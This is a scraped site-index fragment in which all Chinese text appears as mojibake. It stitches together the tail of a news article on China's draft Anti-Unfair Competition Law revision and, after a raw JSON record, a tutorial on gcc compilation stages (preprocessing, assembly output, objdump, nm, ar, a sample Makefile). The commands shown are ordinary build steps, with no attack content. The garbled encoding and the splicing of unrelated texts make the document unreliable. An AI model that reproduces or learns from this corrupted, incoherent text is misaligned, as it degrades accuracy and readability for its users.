å‚ä¸ä¿®è®¢è‰æ¡ˆçš„ä¸“å®¶ã€åŒ—äº¬å¤§å­¦ç«äº‰æ³•ä¸­å¿ƒä¸»ä»»è‚–æ±Ÿå¹³è¯´ï¼Œå¯¹äºäº’è”ç½‘é¢†åŸŸå‡ºç°çš„ä¸€äº›å…¨æ–°çš„ä¸æ­£å½“ç«äº‰è¡Œä¸ºï¼Œç”±äºç°è¡Œæ³•æ²¡æœ‰åˆ†åˆ™æ¡æ¬¾ï¼Œå› è€Œæ³•é™¢å¯¹åŒç§è¡Œä¸ºçš„æ¡ˆä»¶åˆ¤å†³ç»“æœåŒºåˆ«è¾ƒå¤§ã€‚â€œè¿‘10å¹´æ¥ï¼Œè‡³å°‘æœ‰400å¤šä¸ªäº’è”ç½‘é¢†åŸŸä¸æ­£å½“ç«äº‰æ¡ˆä»¶å› ä¸ºæ²¡æœ‰åˆ†åˆ™æ¡æ¬¾ï¼Œæ³•å®˜çš„è‡ªç”±è£é‡å¹…åº¦è¿‡å¤§ï¼Œå­¦ç•Œé¢‡å¤šäº‰è®®ã€‚â€è‚–æ±Ÿå¹³è¯´ã€‚\r- ä¸Šæµ·äº¤é€šå¤§å­¦ç«äº‰æ³•å¾‹ä¸æ”¿ç­–ç ”ç©¶ä¸­å¿ƒä¸»ä»»ç‹å…ˆæ—è¯´ï¼Œæ ¹æ®äº’è”ç½‘åä¸æ­£å½“ç«äº‰çš„å®¢è§‚éœ€è¦ï¼Œä¿®è®¢è‰æ¡ˆä¸­é¦–æ¬¡å¢åŠ äº†äº’è”ç½‘ä¸æ­£å½“ç«äº‰æ¡æ¬¾ã€‚è‰æ¡ˆè§„å®šç«äº‰è€…ä¸å¾—åˆ©ç”¨æŠ€æœ¯æ‰‹æ®µåœ¨äº’è”ç½‘é¢†åŸŸä»äº‹å½±å“ç”¨æˆ·é€‰æ‹©ã€å¹²æ‰°å…¶ä»–ç»è¥è€…æ­£å¸¸ç»è¥æ´»åŠ¨çš„è¡Œä¸ºï¼Œå¹¶å…·ä½“è§„å®šäº†åº”äºˆä»¥ç¦æ­¢çš„è¡Œä¸ºï¼Œå°†å¢å¼ºè¡Œæ”¿æ‰§æ³•æŸ¥å¤„äº’è”ç½‘ä¸æ­£å½“ç«äº‰è¡Œä¸ºçš„ä½œç”¨ã€‚\r ç»†åŒ–å„ç±»æ¶æ„ä»¿å†’è¡Œä¸ºï¼š  93å¹´æ—§æ³•æ¡ï¼š  ç¬¬äº”æ¡ã€€ç»è¥è€…ä¸å¾—é‡‡ç”¨ä¸‹åˆ—ä¸æ­£å½“æ‰‹æ®µä»äº‹å¸‚åœºäº¤æ˜“ï¼ŒæŸå®³ç«äº‰å¯¹æ‰‹ï¼š\rï¼ˆä¸€ï¼‰å‡å†’ä»–äººçš„æ³¨å†Œå•†æ ‡ï¼›\rï¼ˆäºŒï¼‰æ“…è‡ªä½¿ç”¨çŸ¥åå•†å“ç‰¹æœ‰çš„åç§°ã€åŒ…è£…ã€è£…æ½¢ï¼Œæˆ–è€…ä½¿ç”¨ä¸çŸ¥åå•†å“è¿‘ä¼¼çš„åç§°ã€åŒ…è£…ã€è£…æ½¢ï¼Œé€ æˆå’Œä»–äººçš„çŸ¥åå•†å“ç›¸æ··æ·†ï¼Œä½¿è´­ä¹°è€…è¯¯è®¤ä¸ºæ˜¯è¯¥çŸ¥åå•†å“ï¼›\rï¼ˆä¸‰ï¼‰æ“…è‡ªä½¿ç”¨ä»–äººçš„ä¼ä¸šåç§°æˆ–è€…å§“åï¼Œå¼•äººè¯¯è®¤ä¸ºæ˜¯ä»–äººçš„å•†å“ï¼›\rï¼ˆå››ï¼‰åœ¨å•†å“ä¸Šä¼ªé€ æˆ–è€…å†’ç”¨è®¤è¯æ ‡å¿—ã€åä¼˜æ ‡å¿—ç­‰è´¨é‡æ ‡å¿—ï¼Œä¼ªé€ äº§åœ°ï¼Œå¯¹å•†å“è´¨é‡ä½œå¼•äººè¯¯è§£çš„è™šå‡è¡¨ç¤ºã€‚\r- 08å¹´æ–°æ³•æ¡ï¼š\rç¬¬å…­æ¡ã€€ç»è¥è€…ä¸å¾—å®æ–½ä¸‹åˆ—æ··æ·†è¡Œä¸ºï¼Œå¼•äººè¯¯è®¤ä¸ºæ˜¯ä»–äººå•†å“æˆ–è€…ä¸ä»–äººå­˜åœ¨ç‰¹å®šè”ç³»ï¼š\rï¼ˆä¸€ï¼‰æ“…è‡ªä½¿ç”¨ä¸ä»–äººæœ‰ä¸€å®šå½±å“çš„å•†å“åç§°ã€åŒ…è£…ã€è£…æ½¢ç­‰ç›¸åŒæˆ–è€…è¿‘ä¼¼çš„æ ‡è¯†ï¼›\rï¼ˆäºŒï¼‰æ“…è‡ªä½¿ç”¨ä»–äººæœ‰ä¸€å®šå½±å“çš„ä¼ä¸šåç§°ï¼ˆåŒ…æ‹¬ç®€ç§°ã€å­—å·ç­‰ï¼‰ã€ç¤¾ä¼šç»„ç»‡åç§°ï¼ˆåŒ…æ‹¬ç®€ç§°ç­‰ï¼‰ã€å§“åï¼ˆåŒ…æ‹¬ç¬”åã€è‰ºåã€è¯‘åç­‰ï¼‰ï¼›\rï¼ˆä¸‰ï¼‰æ“…è‡ªä½¿ç”¨ä»–äººæœ‰ä¸€å®šå½±å“çš„åŸŸåä¸»ä½“éƒ¨åˆ†ã€ç½‘ç«™åç§°ã€ç½‘é¡µç­‰ï¼›\rï¼ˆå››ï¼‰å…¶ä»–è¶³ä»¥å¼•äººè¯¯è®¤ä¸ºæ˜¯ä»–äººå•†å“æˆ–è€…ä¸ä»–äººå­˜åœ¨ç‰¹å®šè”ç³»çš„æ··æ·†è¡Œä¸ºã€‚\r- å½“å‰ï¼Œå°†ä»–äººæ³¨å†Œå•†æ ‡ç”³è¯·ä¸ºä¼ä¸šå­—å·ç­‰é€ æˆå¸‚åœºæ··æ·†çš„ä¸æ­£å½“ç«äº‰è¡Œä¸ºè¾ƒä¸ºæ™®éï¼Œä¸ä»…æŸå®³äº†ç»è¥è€…çš„åˆæ³•æƒç›Šï¼Œè€Œä¸”å¯¹æ¶ˆè´¹è€…é€ æˆè¯¯å¯¼å’ŒæŸå®³ã€‚è¿™ç±»æ¡ˆä»¶åªèƒ½åœ¨è¯‰è®¼ä¸­é€‚ç”¨åŸºæœ¬åŸåˆ™äºˆä»¥å¤„ç†ï¼Œè¡Œæ”¿æ‰§æ³•æœºå…³æ— æ³•å…·ä½“å®æ–½ã€‚\r- â€œåŒä»å ‚â€æ—¢æ˜¯ä¸­å›½åŒ—äº¬åŒä»å ‚ï¼ˆé›†å›¢ï¼‰æœ‰é™è´£ä»»å…¬å¸çš„å­—å·ï¼Œä¹Ÿæ˜¯å…¶å•†å“çš„ä¸»è¦å•†æ ‡ã€‚ä½†æ˜¯æŒ‰ç…§ç°è¡Œæ³•å¾‹ï¼Œä¼ä¸šåç§°æ˜¯åˆ†çº§æ³¨å†Œï¼Œä¸€äº›ä¸æ³•å•†äººä¸ºæ­â€œåŒä»å ‚â€ä¼ä¸šåèª‰å’Œå•†å“å£°èª‰çš„ä¾¿è½¦ï¼Œä»¥â€œåŒä»å ‚â€ç­‰å­—å·ç»è¥ï¼Œå¾€å¾€å¼•èµ·æ¶ˆè´¹è€…è¯¯è®¤æ˜¯åŒ—äº¬åŒä»å ‚æˆ–è€…ä¸å…¶æœ‰å…³è”ã€‚è¿™ç§æƒ…å½¢å°±å±äºåŸºäºå•†æ ‡ã€ä¼ä¸šå­—å·å†²çªé€ æˆçš„ä¸æ­£å½“ç«äº‰ã€‚\r- å›½å®¶å·¥å•†æ€»å±€ç«äº‰æ‰§æ³•å±€åä¸æ­£å½“ç«äº‰å¤„å¤„é•¿æœé•¿çº¢è¡¨ç¤ºï¼Œä¿®è®¢è‰æ¡ˆç¡®å®šäº†ä½¿ç”¨åœ¨å…ˆä¸å…¬å¹³ç«äº‰å¹¶é‡çš„åŸåˆ™ï¼Œæ„åœ¨å¯¹æ¶æ„ä»¿å†’è¡Œä¸ºè¿›è¡Œåˆ¶æ­¢å’ŒæŸ¥å¤„ã€‚\r- ç‹å…ˆæ—è¯´ï¼Œä¸å•†æ ‡æ³•ç›¸è¡”æ¥ï¼Œä¿®è®¢è‰æ¡ˆå¢åŠ äº†å±äºä¸æ­£å½“ç«äº‰è¡Œä¸ºçš„è§„å®šã€‚å°†ä»–äººæ³¨å†Œå•†æ ‡ã€æœªæ³¨å†Œé©°åå•†æ ‡ä½œä¸ºä¼ä¸šåç§°ä¸­çš„å­—å·ä½¿ç”¨ï¼Œæ¶‰åŠç¬”åã€è‰ºåã€ç¤¾ä¼šç»„ç»‡åç§°åŠå…¶ç®€ç§°ã€åŸŸåä¸»ä½“éƒ¨åˆ†ã€ç½‘ç«™åç§°ã€ç½‘é¡µä»¥åŠé¢‘é“ã€æ ç›®ã€èŠ‚ç›®ç­‰çš„åç§°æ ‡è¯†ï¼Œä¸ç®¡è¿™äº›è¯¯å¯¼å…¬ä¼—çš„è¡Œä¸ºå¦‚ä½•æ”¹å¤´æ¢é¢ï¼Œä»Šåéƒ½æœ‰æœ›è¢«è®¤å®šä¸ºä¸æ­£å½“ç«äº‰ã€‚\r- è‚–æ±Ÿå¹³è¯´ï¼Œç±»ä¼¼æ±Ÿè‹å«è§†çš„â€œéè¯šå‹¿æ‰°â€ã€æµ™æ±Ÿå«è§†çš„â€œä¸­å›½å¥½å£°éŸ³â€ç­‰ç”µè§†èŠ‚ç›®ï¼Œæ­¤å‰çš„çº çº·ï¼Œåœ¨çŸ¥è¯†äº§æƒä¾µæƒå’Œåä¸æ­£å½“ç«äº‰æ–¹é¢ï¼Œå­˜åœ¨ä¸€äº›äº‰è®®ã€‚ä¿®è®¢è‰æ¡ˆæŠŠé¢‘é“ã€æ ç›®ã€èŠ‚ç›®ç­‰åç§°å’Œæ ‡è¯†åˆ—å…¥ä¸æ­£å½“ç«äº‰è¡Œä¸ºæ ‡çš„ï¼Œæœ‰åŠ©äºè§„èŒƒè¿™äº›é¢†åŸŸçš„å¸‚åœºç«äº‰è¡Œä¸ºã€‚\r    "},{"id":369,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/0.%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C/","title":"0.ç¼–è¯‘å™¨çš„å·¥ä½œ","section":"ç¼–è¯‘åŸç†","content":" å‚è€ƒç½‘å€ï¼š\n http://www.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html https://linux.die.net/man/1/gcc https://sourceware.org/ml/binutils/2009-08/msg00193.html https://web.stanford.edu/class/cs193d/handouts/make.pdf   ç¼–è¯‘å™¨çš„å·¥ä½œ #  ç¼–è¯‘å™¨çš„ä¸»è¦æµç¨‹ #  .img{width: 100%}\rä¸€ä¸ªç°ä»£ç¼–è¯‘å™¨çš„ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼šï¼ˆä»¥ gcc ä¸ºä¾‹ï¼‰\nå¦å¤–ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ gcc ä½¿ç”¨çš„æ‰€æœ‰å‘½ä»¤ï¼š\n$ gcc -v example.c è¯¥å‘½ä»¤çš„è¾“å‡ºä¼šæ‰“å°åœ¨ stderr ä¸Šï¼Œè‹¥å¸Œæœ›åœ¨æ–‡ä»¶ä¸­é˜…è¯»è¯¥ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n$ gcc -v example.c 2\u0026gt; verbose_gcc.txt é¢„å¤„ç†å™¨çš„å·¥ä½œ #  ä»ç»´åŸºç™¾ç§‘ä¸Šçš„å®šä¹‰ï¼šé¢„å¤„ç†å™¨æ˜¯ç¨‹åºä¸­å¤„ç†è¾“å…¥æ•°æ®ï¼Œäº§ç”Ÿèƒ½ç”¨æ¥è¾“å…¥åˆ°å…¶ä»–ç¨‹åºçš„æ•°æ®çš„ç¨‹åºã€‚è¾“å‡ºè¢«ç§°ä¸ºè¾“å…¥æ•°æ®é¢„å¤„ç†è¿‡çš„å½¢å¼ï¼Œå¸¸ç”¨åœ¨ä¹‹åçš„ç¨‹åºæ¯”å¦‚ç¼–è¯‘å™¨ä¸­ã€‚C é¢„å¤„ç†å™¨æ˜¯æœ€å¸¸è§çš„é¢„å¤„ç†å™¨ã€‚\nC é¢„å¤„ç†å™¨ #  C é¢„å¤„ç†å™¨ä¸æ˜¯ç¼–è¯‘å™¨çš„ç»„æˆéƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒæ˜¯ç¼–è¯‘è¿‡ç¨‹ä¸­ä¸€ä¸ªå•ç‹¬çš„æ­¥éª¤ã€‚ç®€è¨€ä¹‹ï¼ŒC é¢„å¤„ç†å™¨åªä¸è¿‡æ˜¯ä¸€ä¸ªæ–‡æœ¬æ›¿æ¢å·¥å…·è€Œå·²ï¼Œå®ƒä»¬ä¼šæŒ‡ç¤ºç¼–è¯‘å™¨åœ¨å®é™…ç¼–è¯‘ä¹‹å‰å®Œæˆæ‰€éœ€çš„é¢„å¤„ç†ã€‚\næ‰€æœ‰çš„é¢„å¤„ç†å™¨å‘½ä»¤éƒ½æ˜¯ä»¥äº•å·ï¼ˆ#ï¼‰å¼€å¤´ã€‚å®ƒå¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦ï¼Œä¸ºäº†å¢å¼ºå¯è¯»æ€§ï¼Œé¢„å¤„ç†å™¨æŒ‡ä»¤åº”ä»ç¬¬ä¸€åˆ—å¼€å§‹ã€‚åƒæˆ‘ä»¬å¸¸ç”¨çš„ defineï¼Œinclude ç­‰éƒ½æ˜¯ C é¢„å¤„ç†å™¨çš„é¢„å¤„ç†æŒ‡ä»¤ã€‚\né¢„å®šä¹‰å® #  ANSI C å®šä¹‰äº†è®¸å¤šå®ã€‚åœ¨ç¼–ç¨‹ä¸­æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å®ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹è¿™äº›é¢„å®šä¹‰çš„å®ã€‚\n   å® æè¿°     __DATE__ å½“å‰æ—¥æœŸï¼Œä¸€ä¸ªä»¥ \u0026quot;MMM DD YYYY\u0026quot; æ ¼å¼è¡¨ç¤ºçš„å­—ç¬¦å¸¸é‡ã€‚   __TIME__ å½“å‰æ—¶é—´ï¼Œä¸€ä¸ªä»¥ \u0026quot;HH:MM:SS\u0026quot; æ ¼å¼è¡¨ç¤ºçš„å­—ç¬¦å¸¸é‡ã€‚   __FILE__ è¿™ä¼šåŒ…å«å½“å‰æ–‡ä»¶åï¼Œä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ã€‚   __LINE__ è¿™ä¼šåŒ…å«å½“å‰è¡Œå·ï¼Œä¸€ä¸ªåè¿›åˆ¶å¸¸é‡ã€‚   __STDC__ å½“ç¼–è¯‘å™¨ä»¥ ANSI æ ‡å‡†ç¼–è¯‘æ—¶ï¼Œåˆ™å®šä¹‰ä¸º 1ã€‚    é¢„å¤„ç†å™¨è¿ç®—ç¬¦ #     è¿ç®—ç¬¦ ä½œç”¨     å®å»¶ç»­è¿ç®—ç¬¦ï¼ˆ\\ï¼‰ ä¸€ä¸ªå®é€šå¸¸å†™åœ¨ä¸€ä¸ªå•è¡Œä¸Šã€‚ä½†æ˜¯å¦‚æœå®å¤ªé•¿ï¼Œä¸€ä¸ªå•è¡Œå®¹çº³ä¸ä¸‹ï¼Œåˆ™ä½¿ç”¨å®å»¶ç»­è¿ç®—ç¬¦ï¼ˆ\\ï¼‰ã€‚   å­—ç¬¦ä¸²å¸¸é‡åŒ–è¿ç®—ç¬¦ï¼ˆ#ï¼‰ åœ¨å®å®šä¹‰ä¸­ï¼Œå½“éœ€è¦æŠŠä¸€ä¸ªå®çš„å‚æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¸¸é‡æ—¶ï¼Œåˆ™ä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡åŒ–è¿ç®—ç¬¦ï¼ˆ#ï¼‰ã€‚åœ¨å®ä¸­ä½¿ç”¨çš„è¯¥è¿ç®—ç¬¦æœ‰ä¸€ä¸ªç‰¹å®šçš„å‚æ•°æˆ–å‚æ•°åˆ—è¡¨ã€‚   æ ‡è®°ç²˜è´´è¿ç®—ç¬¦ï¼ˆ##ï¼‰ å®å®šä¹‰å†…çš„æ ‡è®°ç²˜è´´è¿ç®—ç¬¦ï¼ˆ##ï¼‰ä¼šåˆå¹¶ä¸¤ä¸ªå‚æ•°ã€‚å®ƒå…è®¸åœ¨å®å®šä¹‰ä¸­ä¸¤ä¸ªç‹¬ç«‹çš„æ ‡è®°è¢«åˆå¹¶ä¸ºä¸€ä¸ªæ ‡è®°ã€‚    gcc çš„å·¥ä½œ #  ä» Linux gcc manual ä¸Šï¼Œæˆ‘ä»¬çŸ¥é“ gcc ç¼–è¯‘æœ‰è¿™æ ·ä¸€ä¸ªé€‰é¡¹ï¼š-Eï¼š\n -E\nStop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output.\n ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼ŒåŠ å…¥ -E é€‰é¡¹ä¹‹åï¼Œgcc è¿™ä¸ªç¼–è¯‘å™¨ä¼šåœ¨é¢„ç¼–è¯‘ç»“æŸæ—¶åœä¸‹æ¥ã€‚æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼š\n$ cat \u0026lt;\u0026lt; _EOF_ \u0026gt; factor.c #include\u0026lt;stdio.h\u0026gt; main(){ int i, n, f; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); i = 2; f = 1; while (i \u0026lt;= n) { f = f * i; i = i + 1; } printf(\u0026#34;%d\u0026#34;, f); return 0; } _EOF_  $ gcc -E factor.c -o factor.i # å› ä¸ºå½“ -o ç¼ºçœæ—¶ï¼Œé¢„ç¼–è¯‘ç»“æœä¼šè¾“å‡ºåœ¨æ ‡å‡†è¾“å‡ºæµï¼Œå› æ­¤ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š # $ gcc -E factor.c \u0026gt; factor.i #  # æˆ–è€…å¯ä»¥ä½¿ç”¨ä¹‹å‰æåˆ°çš„ `cpp` è¿›è¡Œé¢„ç¼–è¯‘ # $ cpp factor.c \u0026gt; factor.i  $ cat preprecess_factor | less è¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ° include è¿™ä¸€è¡Œä¸è§äº†ï¼Œå› ä¸º #include æ˜¯ä¸€ä¸ª C é¢„å¤„ç†å™¨çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå®ƒè¢«é¢„ç¼–è¯‘ï¼Œå¯¼å…¥äº†å¦‚ä¸‹çš„ stdio çš„åŒ…ï¼š\n\u0026hellip;\u0026hellip;\nPostScriptï¼šå…³äº gcc çš„ -o é€‰é¡¹ç¼ºçœçš„é—®é¢˜ï¼š\n If -o is not specified, the default is to put an executable file in a.out, the object file for source.suffix in source.o, its assembler file in source.s, a precompiled header file in source.suffix.gch, and all preprocessed C source on standard output.\n ç¼–è¯‘å™¨çš„å·¥ä½œ #  ç¼–è¯‘å™¨ï¼Œå³ compilerã€‚ä»ç»´åŸºç™¾ç§‘ä¸Šçš„å®šä¹‰ï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºç¨‹åºï¼Œå®ƒä¼šå°†ç”¨æŸç§ç¼–ç¨‹è¯­è¨€å†™æˆçš„æºä»£ç ï¼ˆåŸå§‹è¯­è¨€ï¼‰ï¼Œè½¬æ¢æˆå¦ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼ˆç›®æ ‡è¯­è¨€ï¼‰ã€‚\nåœ¨æˆ‘ä»¬ç ”ç©¶çš„èŒƒå›´å†…ï¼Œç¼–è¯‘å™¨çš„åŠŸèƒ½æ˜¯å°† C è¯­è¨€è½¬åŒ–æˆ æ±‡ç¼–è¯­è¨€æˆ–æœºå™¨è¯­è¨€ã€‚åŒç†å‚è€ƒ gcc Linux manualï¼š\n -S\nStop after the stage of compilation proper; do not assemble. The output is in the form of an assembler code file for each non-assembler input file specified.\n è¿™ä¸€ä¸ªé€‰é¡¹ä¼šè®© gcc åœ¨ç¼–è¯‘ä¹‹ååœæ­¢ï¼Œä¸è¿›è¡Œä¸‹ä¸€æ­¥æ±‡ç¼–æ“ä½œï¼Œè€Œè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼š\n$ gcc factor.c -S  $ cat factor.s  .file \u0026#34;factor.c\u0026#34;  .def __main; .scl 2; .type 32; .endef  .section .rdata,\u0026#34;dr\u0026#34; .LC0:  .ascii \u0026#34;%d\\0\u0026#34;  .text  .globl main  .def main; .scl 2; .type 32; .endef  .seh_proc main main:  pushq %rbp  .seh_pushreg %rbp  movq %rsp, %rbp  .seh_setframe %rbp, 0  subq $48, %rsp  .seh_stackalloc 48  .seh_endprologue  call __main  leaq -12(%rbp), %rax  movq %rax, %rdx  leaq .LC0(%rip), %rcx  call scanf  movl $2, -4(%rbp)  movl $1, -8(%rbp)  jmp .L2 .L3:  movl -8(%rbp), %eax  imull -4(%rbp), %eax  movl %eax, -8(%rbp)  addl $1, -4(%rbp) .L2:  movl -12(%rbp), %eax  cmpl %eax, -4(%rbp)  jle .L3  movl -12(%rbp), %eax  movl %eax, %edx  leaq .LC0(%rip), %rcx  call printf  addq $48, %rsp  popq %rbp  ret  .seh_endproc  .ident \u0026#34;GCC: (GNU) 4.8.3\u0026#34;  .def scanf; .scl 2; .type 32; .endef  .def printf; .scl 2; .type 32; .endef æˆ‘æ‰¾åˆ°è¿™ä¸ªç½‘å€ï¼Œæœ‰å¯¹ gcc ç¼–è¯‘ä¸­é—´æ±‡ç¼–ä»£ç ç»“æœçš„è¯¦ç»†æè¿°ã€‚\næ±‡ç¼–å™¨çš„å·¥ä½œ #  æ±‡ç¼–å™¨ï¼ˆAssemblerï¼‰æ˜¯å°†æ±‡ç¼–è¯­è¨€ç¿»è¯‘ä¸ºæœºå™¨è¯­è¨€çš„ç¨‹åºã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œæ±‡ç¼–ç”Ÿæˆçš„æ˜¯ç›®æ ‡ä»£ç ï¼Œéœ€è¦ç»é“¾æ¥å™¨ï¼ˆLinkerï¼‰ç”Ÿæˆå¯æ‰§è¡Œä»£ç æ‰å¯ä»¥æ‰§è¡Œã€‚\n -c\nCompile or assemble the source files, but do not link. The linking stage simply is not done. The ultimate output is in the form of an object file for each source file.\n å½“ä½¿ç”¨ gcc çš„ -c é€‰é¡¹æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªæœªé“¾æ¥çš„ç›®æ ‡æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ï¼š\n$ gcc -c factor.c # æˆ–è€…å¯ä»¥ç”±æˆ‘ä»¬å·²ç»å¾—åˆ°çš„æ±‡ç¼–ä»£ç ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤æ±‡ç¼–æˆæœºå™¨ç ï¼š # $ as factor.s -o factor.o  $ ls | grep \\\\.o factor.o # gcc -c æŒ‡ä»¤ï¼Œå½“ -o é€‰é¡¹ç¼ºçœæ—¶ï¼Œé»˜è®¤è¾“å‡ºæ–‡ä»¶ä¸º factor.o åˆ†æ obj æ–‡ä»¶ #  ä½¿ç”¨è¯¥ objdump æŒ‡ä»¤å¯ä»¥çœ‹åˆ° .o æ–‡ä»¶çš„åæ±‡ç¼–ä»£ç ã€‚\n$ objdump -d factor.o  factor.o: file format pe-x86-64   Disassembly of section .text:  0000000000000000 \u0026lt;main\u0026gt;:  0: 55 push %rbp  1: 48 89 e5 mov %rsp,%rbp  4: 48 83 ec 30 sub $0x30,%rsp  8: e8 00 00 00 00 callq d \u0026lt;main+0xd\u0026gt;  d: 48 8d 45 f4 lea -0xc(%rbp),%rax  11: 48 89 c2 mov %rax,%rdx  14: 48 8d 0d 00 00 00 00 lea 0x0(%rip),%rcx # 1b \u0026lt;main+0x1b\u0026gt;  1b: e8 00 00 00 00 callq 20 \u0026lt;main+0x20\u0026gt;  20: c7 45 fc 02 00 00 00 movl $0x2,-0x4(%rbp)  27: c7 45 f8 01 00 00 00 movl $0x1,-0x8(%rbp)  2e: eb 0e jmp 3e \u0026lt;main+0x3e\u0026gt;  30: 8b 45 f8 mov -0x8(%rbp),%eax  33: 0f af 45 fc imul -0x4(%rbp),%eax  37: 89 45 f8 mov %eax,-0x8(%rbp)  3a: 83 45 fc 01 addl $0x1,-0x4(%rbp)  3e: 8b 45 f4 mov -0xc(%rbp),%eax  41: 39 45 fc cmp %eax,-0x4(%rbp)  44: 7e ea jle 30 \u0026lt;main+0x30\u0026gt;  46: 8b 45 f4 mov -0xc(%rbp),%eax  49: 89 c2 mov %eax,%edx  4b: 48 8d 0d 00 00 00 00 lea 0x0(%rip),%rcx # 52 \u0026lt;main+0x52\u0026gt;  52: e8 00 00 00 00 callq 57 \u0026lt;main+0x57\u0026gt;  57: 48 83 c4 30 add $0x30,%rsp  5b: 5d pop %rbp  5c: c3 retq  5d: 90 nop  5e: 90 nop  5f: 90 nop ä½¿ç”¨ nm æŒ‡ä»¤å¯ä»¥æŸ¥çœ‹ obj æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ï¼š\n$ nm factor.o 0000000000000000 b .bss 0000000000000000 d .data 0000000000000000 p .pdata 0000000000000000 r .rdata 0000000000000000 r .rdata$zzz 0000000000000000 t .text 0000000000000000 r .xdata  U __main 0000000000000000 T main  U printf  U scanf # ç¬¬äºŒåˆ—ä¸­å‡ºç°äº†ä¸€äº›ç¬¦å·ï¼Œå…¶ä¸­ï¼š # `T` è¡¨ç¤ºè¯¥ç¬¦å·å·²ç»è¢«å®šä¹‰äº†ï¼Œ`U` è¡¨ç¤ºè¯¥ç¬¦å·è¿˜éœ€è¦è¢«é“¾æ¥å™¨å®šä¹‰ é“¾æ¥å™¨çš„å·¥ä½œ #  é“¾æ¥å™¨ä¼šé“¾æ¥ç›®æ ‡ä»£ç å’Œåº“ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ factor.exeã€‚å…¶ä¸­ ld æ˜¯ GNU çš„é“¾æ¥å™¨ã€‚\nGNU ar #  GUN ar program manual page.\nWhat does ar do?\n åˆ›å»ºï¼Œä¿®æ”¹å’Œæå–å­˜æ¡£ï¼ˆarchivesï¼‰  What is archives?\n å­˜æ¡£æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç»“æ„ä¸­çš„å…¶ä»–æ–‡ä»¶é›†åˆï¼Œå¯ä»¥æ£€ç´¢åŸå§‹çš„å•ä¸ªæ–‡ä»¶ï¼ˆè¿™äº›å•ä¸ªæ–‡ä»¶è¢«ç§°ä¸ºå­˜æ¡£çš„æˆå‘˜ï¼Œmember of archivesï¼‰  ä»¥ä¸‹ä¸ºä¸€ä¸ªæ˜¯ç”¨ ar åˆ›å»ºé™æ€é“¾æ¥åº“çš„å®ä¾‹ï¼š\n$ gcc -c header.cpp -o header  $ ar rvs header.lib header.o  $ gcc main.cpp header.lib GNU Makefile #  Makefile æ˜¯ä¸€ä¸ªåŒ…å«ä¸€ç³»åˆ—æ ¼å¼åŒ–å‘½ä»¤çš„æ–‡ä»¶ï¼Œä½¿ç”¨ make å‘½ä»¤ï¼ŒGUN ä¼šè‡ªåŠ¨æ‰¾åˆ° Makefile è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ‰§è¡Œé‡Œé¢æè¿°çš„å‘½ä»¤å‚æ•°ã€‚\nMakefile ä¸»è¦ç”±ä»¥ä¸‹çš„ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š\n \u0026ldquo;target\u0026rdquo;ï¼šé€šå¸¸æ˜¯æŒ‡å¯æ‰§è¡Œæ–‡ä»¶æˆ–å¯¹è±¡æ–‡ä»¶çš„æ–‡ä»¶åã€‚ \u0026ldquo;prerequisites\u0026rdquo;ï¼šä¸€ä¸ªæ–‡ä»¶åˆ—è¡¨ï¼Œå…¶ä¸­åˆ—ä¸¾å‡ºäº†åˆ›å»º \u0026ldquo;target\u0026rdquo; æ–‡ä»¶éœ€è¦çš„ä¾èµ–æ–‡ä»¶ã€‚ \u0026ldquo;command\u0026rdquo;ï¼šåˆ›å»ºæ–‡ä»¶æ—¶ï¼Œæ‰§è¡Œçš„ä¸€ç³»åˆ—ç¼–è¯‘æˆ–é“¾æ¥å‘½ä»¤ã€‚  åŸºäºè¿™ä¸‰ä¸ªç®€å•è§„åˆ™çš„ Makefile æ–‡ä»¶å¯ä»¥å†™æˆå¦‚ä¸‹çš„å½¢å¼ï¼šï¼ˆå…¶ä¸­ï¼Œclean å¯ä»¥ç”¨æ¥æ¸…é™¤æŸåçš„æ–‡ä»¶ç­‰ï¼Œå¯ä»¥åœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤ make clean è¿›è¡Œè°ƒç”¨ï¼‰\ntextr : main.o blurb.o database.o \tg++ -o textr main.o blurb.o database.o main.o : main.cpp \tg++ -c main.cpp blurb.o : blurb.cpp blurb.h \tg++ -c blurb.cpp database.o : database.cpp database.h \tg++ -c database.cpp clean: \trm -f core textr main.o blurb.o database.o æˆ‘ä»¬å¯ä»¥åœ¨ 